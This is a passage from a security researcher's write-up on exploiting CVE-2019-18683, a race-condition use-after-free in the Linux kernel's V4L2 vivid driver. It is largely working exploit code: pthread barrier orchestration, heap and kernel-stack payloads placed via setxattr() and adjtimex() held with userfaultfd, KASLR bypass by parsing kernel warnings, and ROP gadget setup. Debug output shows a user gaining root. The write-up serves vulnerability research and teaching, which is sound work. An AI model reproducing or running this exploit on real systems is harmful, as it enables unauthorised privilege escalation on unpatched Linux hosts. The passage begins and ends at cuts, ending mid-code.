<p>Moreover, when <code class="language-plaintext highlighter-rouge">vaddr()</code> is called, it takes <code class="language-plaintext highlighter-rouge">vb2_buffer.planes[0].mem_priv</code> as an argument.</p>

<h2 id="unexpected-troubles-kthread-context">Unexpected troubles: kthread context</h2>

<p>After discovering <code class="language-plaintext highlighter-rouge">vb2_mem_ops.vaddr</code> I started to investigate the minimal payload needed for me to get the <code class="language-plaintext highlighter-rouge">V4L2</code> code to reach this function pointer.</p>

<p>First of all I disabled <code class="language-plaintext highlighter-rouge">SMAP</code> (Supervisor Mode Access Prevention), <code class="language-plaintext highlighter-rouge">SMEP</code> (Supervisor Mode Execution Prevention), and <code class="language-plaintext highlighter-rouge">KPTI</code> (Kernel Page-Table Isolation). Then I made <code class="language-plaintext highlighter-rouge">vb2_buffer.vb2_queue</code> point to the mmap'ed memory area in the userspace. Dereferencing that pointer was giving an error: <code class="language-plaintext highlighter-rouge">"unable to handle page fault"</code>. It turned out that the pointer is dereferenced in the <code class="language-plaintext highlighter-rouge">kernel thread context</code>, where my userspace is not mapped at all.</p>

<p>So constructing the payload became a sticking point: I needed to place <code class="language-plaintext highlighter-rouge">vb2_queue</code> and <code class="language-plaintext highlighter-rouge">vb2_mem_ops</code> at known memory addresses that can be accessed from the kthread context.</p>

<h2 id="insight--thats-why-we-do-it">Insight – that's why we do it</h2>

<p>During these experiments I dropped my kernel code changes that I had developed for deeper fuzzing. And I saw that my PoC exploit hit some <code class="language-plaintext highlighter-rouge">V4L2</code> warning before performing use-after-free. This is the code in <code class="language-plaintext highlighter-rouge">__vb2_queue_cancel()</code> that gives the warning:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="cm">/*
	 * If you see this warning, then the driver isn't cleaning up properly
	 * in stop_streaming(). See the stop_streaming() documentation in
	 * videobuf2-core.h for more information how buffers should be returned
	 * to vb2 in stop_streaming().
	 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">WARN_ON</span><span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">owned_by_drv_count</span><span class="p">)))</span> <span class="p">{</span>
</code></pre></div></div>

<p>I realized that I could parse the kernel warning information (which is available to regular users on Ubuntu Server). But I didn't know what to do with it. After some time I decided to ask my friend <a href="https://twitter.com/andreyknvl">Andrey Konovalov</a> aka <a href="https://github.com/xairy">xairy</a>, who is a well-known Linux kernel security researcher. He presented me with a cool idea – <code class="language-plaintext highlighter-rouge">to put the payload on the kernel stack and hold it there using userfaultfd(), similarly to Vitaly's heap spray</code>. We can do this with any syscall that moves data to the kernel stack using <code class="language-plaintext highlighter-rouge">copy_from_user()</code>. I believe this to be a novel technique, so I will refer it to as <strong>xairy's method</strong> to credit my friend.</p>

<p>I understood that I could get the kernel stack location by parsing the warning and then anticipate the future address of my payload. This was the most sublime moment of my entire quest. These are the moments that make all the effort worth it, right?</p>

<p>Now let's collect all the exploit steps together before describing the payload bytes. The described method allows bypassing <code class="language-plaintext highlighter-rouge">SMAP</code>, <code class="language-plaintext highlighter-rouge">SMEP</code>, and <code class="language-plaintext highlighter-rouge">KASLR</code> on Ubuntu Server 18.04.</p>

<h2 id="exploit-orchestra">Exploit orchestra</h2>

<p>For this quite complex exploit I created a pool of pthreads and orchestrated them using synchronization at <code class="language-plaintext highlighter-rouge">pthread_barriers</code>. Here are the <code class="language-plaintext highlighter-rouge">pthread_barriers</code> that mark the main reference points during exploitation:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)
</span>
<span class="cp">#define THREADS_N 50
</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_prepare</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_race</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_parse</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_kstack</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_spray</span><span class="p">;</span>
	<span class="n">pthread_barrier_t</span> <span class="n">barrier_fatality</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_prepare</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">THREADS_N</span> <span class="o">-</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] pthread_barrier_init"</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_race</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] pthread_barrier_init"</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_parse</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] pthread_barrier_init"</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_kstack</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] pthread_barrier_init"</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_spray</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">THREADS_N</span> <span class="o">-</span> <span class="mi">5</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] pthread_barrier_init"</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">pthread_barrier_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">barrier_fatality</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] pthread_barrier_init"</span><span class="p">);</span>
</code></pre></div></div>

<p>Each pthread has a special role. In this particular exploit I have <strong>50 pthreads in five different roles</strong>:</p>
<ul>
  <li>2 <code class="language-plaintext highlighter-rouge">racer</code> pthreads</li>
  <li>(THREADS_N - 6) = 44 <code class="language-plaintext highlighter-rouge">sprayer</code> pthreads, which hang on <code class="language-plaintext highlighter-rouge">setxattr()</code> powered by <code class="language-plaintext highlighter-rouge">userfaultfd()</code></li>
  <li>2 pthreads for <code class="language-plaintext highlighter-rouge">userfaultfd()</code> page fault handling</li>
  <li>1 pthread for parsing <code class="language-plaintext highlighter-rouge">/dev/kmsg</code> and adapting the payload</li>
  <li>1 <code class="language-plaintext highlighter-rouge">fatality</code> pthread, which triggers the privilege escalation</li>
</ul>

<p>The pthreads with different roles synchronize at a different set of barriers. The last parameter of <code class="language-plaintext highlighter-rouge">pthread_barrier_init()</code> specifies the number of pthreads that <strong>must</strong> call <code class="language-plaintext highlighter-rouge">pthread_barrier_wait()</code> for that particular barrier before they can continue all together.</p>

<p><img src="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/symphony.png" alt="Image source: https://singletothemax.files.wordpress.com/2011/02/symphony_099_cropped1.jpg"></p>

<p>The following table describes all the pthreads of this exploit, their work, and synchronization via <code class="language-plaintext highlighter-rouge">pthread_barrier_wait()</code>. The barriers are listed in chronological order. The table is best read row by row, remembering that all the pthreads work in parallel.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/pthreads_vs_barriers.png" width="190"></th>
      <th style="text-align: left">2 racers</th>
      <th style="text-align: left">44 sprayers</th>
      <th style="text-align: left">page fault hander #1</th>
      <th style="text-align: left">page fault hander #2</th>
      <th style="text-align: left">kmsg parser</th>
      <th style="text-align: left">fatality</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><strong>1. <br> barrier_prepare</strong> <br> (for 47 pthreads)</td>
      <td style="text-align: left">&nbsp;wait&nbsp;on&nbsp;barrier</td>
      <td style="text-align: left"><strong>1.</strong> create files in tmpfs for doing <code class="language-plaintext highlighter-rouge">setxattr()</code> later <br> <strong>2.</strong>&nbsp;wait&nbsp;on&nbsp;barrier</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left"><strong>1.</strong> open <code class="language-plaintext highlighter-rouge">/dev/kmsg</code> <br> <strong>2.</strong>&nbsp;wait&nbsp;on&nbsp;barrier</td>
      <td style="text-align: left">&nbsp;</td>
    </tr>
    <tr>
      <td style="text-align: center"><strong>2. <br> barrier_race</strong> <br> (for 2 pthreads)</td>
      <td style="text-align: left"><strong>1.</strong> <code class="language-plaintext highlighter-rouge">usleep()</code> to let other pthreads go to their next barrier <br> <strong>2.</strong>&nbsp;wait&nbsp;on&nbsp;barrier <br> <strong>3.</strong> race</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
    </tr>
    <tr>
      <td style="text-align: center"><strong>3. <br> barrier_parse</strong> <br> (for 3 pthreads)</td>
      <td style="text-align: left">&nbsp;wait&nbsp;on&nbsp;barrier</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left"><strong>1.</strong>&nbsp;wait&nbsp;on&nbsp;barrier <br> <strong>2.</strong> parse the kernel warning to extract <code class="language-plaintext highlighter-rouge">RSP</code> and <code class="language-plaintext highlighter-rouge">R11</code> (contains a pointer to code)<br> <strong>3.</strong> calculate the address of the kernel stack top and the <code class="language-plaintext highlighter-rouge">KASLR</code> offset <br> <strong>4.</strong> adapt the pointers in the payloads for kernel heap and stack</td>
      <td style="text-align: left">&nbsp;</td>
    </tr>
    <tr>
      <td style="text-align: center"><strong>4. <br> barrier_kstack</strong> <br> (for 3 pthreads)</td>
      <td style="text-align: left"><strong>1.</strong>&nbsp;wait&nbsp;on&nbsp;barrier <br> <strong>2.</strong> place the kernel stack payload via <code class="language-plaintext highlighter-rouge">adjtimex()</code> and hang</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;wait&nbsp;on&nbsp;barrier</td>
      <td style="text-align: left">&nbsp;</td>
    </tr>
    <tr>
      <td style="text-align: center"><strong>5. <br> barrier_spray</strong> <br> (for 45 pthreads)</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left"><strong>1.</strong>&nbsp;wait&nbsp;on&nbsp;barrier <br> <strong>2.</strong> place the kernel heap payload via <code class="language-plaintext highlighter-rouge">setxattr()</code> and hang</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left"><strong>1.</strong> catch 2 page faults from <code class="language-plaintext highlighter-rouge">adjtimex()</code> called by racers <br> <strong>2.</strong>&nbsp;wait&nbsp;on&nbsp;barrier</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
    </tr>
    <tr>
      <td style="text-align: center"><strong>6. <br> barrier_fatality</strong> <br> (for 2 pthreads)</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left"><strong>1.</strong> catch 44 page faults from <code class="language-plaintext highlighter-rouge">setxattr()</code> called by sprayers <br> <strong>2.</strong>&nbsp;wait&nbsp;on&nbsp;barrier</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left">&nbsp;</td>
      <td style="text-align: left"><strong>1.</strong>&nbsp;wait&nbsp;on&nbsp;barrier <br> <strong>2.</strong> trigger the payload for privilege escalation <br> <strong>3.</strong> the end!</td>
    </tr>
  </tbody>
</table>

<p>Here is the exploit debug output perfectly demonstrating the workflow described in the table:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a13x@ubuntu_server_1804:~$ uname -a
Linux ubuntu_server_1804 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
a13x@ubuntu_server_1804:~$ 
a13x@ubuntu_server_1804:~$ ./v4l2-pwn 
begin as: uid=1000, euid=1000
Prepare the payload:
 [+] payload for_heap is mmaped to 0x7f8c9e9b0000
 [+] vivid_buffer of size 504 is at 0x7f8c9e9b0e08
 [+] payload for_stack is mmaped to 0x7f8c9e9ae000
 [+] timex of size 208 is at 0x7f8c9e9aef38
 [+] userfaultfd #1 is configured: start 0x7f8c9e9b1000, len 0x1000
 [+] userfaultfd #2 is configured: start 0x7f8c9e9af000, len 0x1000
We have 4 CPUs for racing; now create 50 pthreads...
 [+] racer 1 is ready on CPU 1
 [+] fatality is ready
 [+] racer 0 is ready on CPU 0
 [+] fault_handler for uffd 3 is ready
 [+] kmsg parser is ready
 [+] fault_handler for uffd 4 is ready
 [+] 44 sprayers are ready (passed the barrier)
Racer 1: GO!
Racer 0: GO!
 [+] found rsp "ffffb93600eefd60" in kmsg
 [+] kernel stack top is 0xffffb93600ef0000
 [+] found r11 "ffffffff9d15d80d" in kmsg
 [+] kaslr_offset is 0x1a800000
Adapt payloads knowing that kstack is 0xffffb93600ef0000, kaslr_offset 0x1a800000:
   vb2_queue of size 560 will be at 0xffffb93600eefe30, userspace 0x7f8c9e9aef38
   mem_ops ptr will be at 0xffffb93600eefe68, userspace 0x7f8c9e9aef70, value 0xffffb93600eefe70
   mem_ops struct of size 120 will be at 0xffffb93600eefe70, userspace 0x7f8c9e9aef78, vaddr 0xffffffff9bc725f1 at 0x7f8c9e9aefd0
   rop chain will be at 0xffffb93600eefe80, userspace 0x7f8c9e9aef88
   cmd will be at ffffb93600eefedc, userspace 0x7f8c9e9aefe4
 [+] the payload for kernel heap and stack is ready. Put it.
 [+] UFFD_EVENT_PAGEFAULT for uffd 4 on address = 0x7f8c9e9af000: 2 faults collected
 [+] fault_handler for uffd 4 passed the barrier
 [+] UFFD_EVENT_PAGEFAULT for uffd 3 on address = 0x7f8c9e9b1000: 44 faults collected
 [+] fault_handler for uffd 3 passed the barrier
 [+] and now fatality: run the shell command as root!
</code></pre></div></div>

<h2 id="anatomy-of-the-exploit-payload">Anatomy of the exploit payload</h2>

<p>In the previous section, I described orchestration of the exploit pthreads. I mentioned that the exploit payload is created in two locations:</p>
<ol>
  <li>In the kernel heap by <code class="language-plaintext highlighter-rouge">sprayer</code> pthreads using <code class="language-plaintext highlighter-rouge">setxattr()</code> syscall powered by <code class="language-plaintext highlighter-rouge">userfaultfd()</code>.</li>
  <li>In the kernel stack by <code class="language-plaintext highlighter-rouge">racer</code> pthreads using <code class="language-plaintext highlighter-rouge">adjtimex()</code> syscall powered by <code class="language-plaintext highlighter-rouge">userfaultfd()</code>. That syscall is chosen because it performs <code class="language-plaintext highlighter-rouge">copy_from_user()</code> to the kernel stack.</li>
</ol>

<p>The exploit payload consists of three parts:</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">vb2_buffer</code> in kernel heap</li>
  <li><code class="language-plaintext highlighter-rouge">vb2_queue</code> in kernel stack</li>
  <li><code class="language-plaintext highlighter-rouge">vb2_mem_ops</code> in kernel stack</li>
</ol>

<p>Now see the code that creates this payload. At the beginning of the exploit, I prepare the payload contents in the userspace.
That memory is for the <code class="language-plaintext highlighter-rouge">setxattr()</code> syscall, which will put it on the kernel heap:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define MMAP_SZ 0x2000
#define PAYLOAD_SZ 504
</span>
<span class="kt">void</span> <span class="nf">init_heap_payload</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="n">vbuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">vb2_plane</span> <span class="o">*</span><span class="n">vplane</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="n">for_heap</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MMAP_SZ</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
					<span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">for_heap</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] mmap"</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">" [+] payload for_heap is mmaped to %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">for_heap</span><span class="p">);</span>

	<span class="cm">/* Don't touch the second page (needed for userfaultfd) */</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">for_heap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>

	<span class="n">xattr_addr</span> <span class="o">=</span> <span class="n">for_heap</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="n">PAYLOAD_SZ</span><span class="p">;</span>

	<span class="n">vbuf</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="p">)</span><span class="n">xattr_addr</span><span class="p">;</span>

	<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">num_planes</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">vplane</span> <span class="o">=</span> <span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">planes</span><span class="p">;</span>
	<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">bytesused</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
	<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
	<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">min_length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">" [+] vivid_buffer of size %lu is at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
					<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">vivid_buffer</span><span class="p">),</span> <span class="n">vbuf</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And that memory is for the <code class="language-plaintext highlighter-rouge">adjtimex()</code> syscall, which will put it on the kernel stack:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PAYLOAD2_SZ 208
</span>
<span class="kt">void</span> <span class="nf">init_stack_payload</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">for_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MMAP_SZ</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
					<span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">for_stack</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] mmap"</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">" [+] payload for_stack is mmaped to %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">for_stack</span><span class="p">);</span>

	<span class="cm">/* Don't touch the second page (needed for userfaultfd) */</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">for_stack</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>

	<span class="n">timex_addr</span> <span class="o">=</span> <span class="n">for_stack</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="n">PAYLOAD2_SZ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" [+] timex of size %lu is at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
				<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">timex</span><span class="p">),</span> <span class="n">timex_addr</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As I described earlier, after hitting the race condition the <code class="language-plaintext highlighter-rouge">kmsg</code> parsing pthread extracts the following information from the kernel warning:</p>
<ul>
  <li>The <code class="language-plaintext highlighter-rouge">RSP</code> value to calculate the address of kernel stack top.</li>
  <li>The <code class="language-plaintext highlighter-rouge">R11</code> value that points to some constant location in the kernel code. This value helps to calculate the <code class="language-plaintext highlighter-rouge">KASLR</code> offset: <br>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define R11_COMPONENT_TO_KASLR_OFFSET 0x195d80d
#define KERNEL_TEXT_BASE 0xffffffff81000000
</span>
<span class="n">kaslr_offset</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
<span class="n">kaslr_offset</span> <span class="o">-=</span> <span class="n">R11_COMPONENT_TO_KASLR_OFFSET</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">kaslr_offset</span> <span class="o">&lt;</span> <span class="n">KERNEL_TEXT_BASE</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"bad kernel text base 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr_offset</span><span class="p">);</span>
    <span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] kmsg parsing for r11"</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">kaslr_offset</span> <span class="o">-=</span> <span class="n">KERNEL_TEXT_BASE</span><span class="p">;</span>
</code></pre></div>    </div>
    <p><br></p>
  </li>
</ul>

<p>Then the <code class="language-plaintext highlighter-rouge">kmsg</code> parsing pthread adapts the heap and stack payload. The most interesting and complex part! To understand it have a look at the debug output of this code (posted above).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define TIMEX_STACK_OFFSET 0x1d0
</span>
<span class="cp">#define LIST_OFFSET 24
#define OPS_OFFSET 64
#define CMD_OFFSET 172
</span>
<span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="n">vbuf</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="p">)</span><span class="n">xattr_addr</span><span class="p">;</span>
<span class="k">struct</span> <span class="n">vb2_queue</span> <span class="o">*</span><span class="n">vq</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="k">struct</span> <span class="n">vb2_mem_ops</span> <span class="o">*</span><span class="n">memops</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="k">struct</span> <span class="n">vb2_plane</span> <span class="o">*</span><span class="n">vplane</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"Adapt payloads knowing that kstack is 0x%lx, kaslr_offset 0x%lx:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
	<span class="n">kstack</span><span class="p">,</span>
	<span class="n">kaslr_offset</span><span class="p">);</span>

<span class="cm">/* point to future position of vb2_queue in timex payload on kernel stack */</span>
<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">vb2_queue</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_queue</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span><span class="p">);</span>
<span class="n">vq</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_queue</span> <span class="o">*</span><span class="p">)</span><span class="n">timex_addr</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"   vb2_queue of size %lu will be at %p, userspace %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
	<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">vb2_queue</span><span class="p">),</span>
	<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">vb2_queue</span><span class="p">,</span>
	<span class="n">vq</span><span class="p">);</span>

<span class="cm">/* just to survive vivid list operations */</span>
<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">list</span><span class="p">.</span><span class="n">next</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">LIST_OFFSET</span><span class="p">);</span>
<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">list</span><span class="p">.</span><span class="n">prev</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">LIST_OFFSET</span><span class="p">);</span>

<span class="cm">/*
 * point to future position of vb2_mem_ops in timex payload on kernel stack;
 * mem_ops offset is 0x38, be careful with OPS_OFFSET
 */</span>
<span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_mem_ops</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">OPS_OFFSET</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"   mem_ops ptr will be at %p, userspace %p, value %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
	<span class="o">&amp;</span><span class="p">(</span><span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">vb2_queue</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">),</span>
	<span class="o">&amp;</span><span class="p">(</span><span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">),</span>
	<span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">);</span>

<span class="n">memops</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_mem_ops</span> <span class="o">*</span><span class="p">)(</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">OPS_OFFSET</span><span class="p">);</span>

<span class="cm">/* vaddr offset is 0x58, be careful with ROP_CHAIN_OFFSET */</span>
<span class="n">memops</span><span class="o">-&gt;</span><span class="n">vaddr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"   mem_ops struct of size %lu will be at %p, userspace %p, vaddr %p at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
	<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">vb2_mem_ops</span><span class="p">),</span>
	<span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">,</span>
